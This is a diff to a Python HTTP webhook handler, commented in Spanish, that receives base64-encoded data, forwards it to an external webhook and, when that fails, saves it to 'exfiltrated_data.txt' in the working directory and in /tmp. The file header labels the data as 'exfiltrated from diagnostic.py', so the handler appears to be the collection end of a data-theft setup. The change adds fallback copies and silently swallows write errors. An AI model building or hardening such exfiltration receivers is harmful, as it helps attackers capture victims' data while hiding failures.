@@ -40,27 +40,32 @@ class WebhookHandler(BaseHTTPRequestHandler):
                     data_sent_successfully = True
                 except Exception as external_error:
                     print(f"[!] External webhook FAILED: {external_error}")
-                    print(f"[*] Saving data locally for manual transmission...")
+                    print(f"[*] Saving data to fallback locations...")
                     
-                    # Guardar en archivo para transmisión manual
-                    output_file = "exfiltrated_data.txt"
-                    try:
-                        with open(output_file, 'w') as f:
-                            f.write(f"# Data exfiltrated from diagnostic.py\n")
-                            f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                            f.write(f"# Full URL:\n")
-                            f.write(f"# {external_url}\n\n")
-                            f.write(f"# Base64 Data:\n")
-                            f.write(f"{received_data}\n\n")
-                            f.write(f"# Decoded Data:\n")
-                            try:
-                                decoded = base64.b64decode(received_data).decode('utf-8', errors='replace')
-                                f.write(decoded)
-                            except:
-                                f.write("Could not decode")
-                        print(f"[+] Data saved to: {output_file}")
-                    except Exception as file_error:
-                        print(f"[!] Could not save file: {file_error}")
+                    # Guardar en múltiples ubicaciones
+                    save_locations = [
+                        "exfiltrated_data.txt",  # Local
+                        "/tmp/exfiltrated_data.txt",  # /tmp global
+                    ]
+                    
+                    for output_file in save_locations:
+                        try:
+                            with open(output_file, 'w') as f:
+                                f.write(f"# Data exfiltrated from diagnostic.py\n")
+                                f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                                f.write(f"# Full URL:\n")
+                                f.write(f"# {external_url}\n\n")
+                                f.write(f"# Base64 Data:\n")
+                                f.write(f"{received_data}\n\n")
+                                f.write(f"# Decoded Data:\n")
+                                try:
+                                    decoded = base64.b64decode(received_data).decode('utf-8', errors='replace')
+                                    f.write(decoded)
+                                except:
+                                    f.write("Could not decode")
+                            print(f"[+] Data saved to: {output_file}")
+                        except Exception as file_error:
+                            pass
         
         # Responder 200 OK
         self.send_response(200)
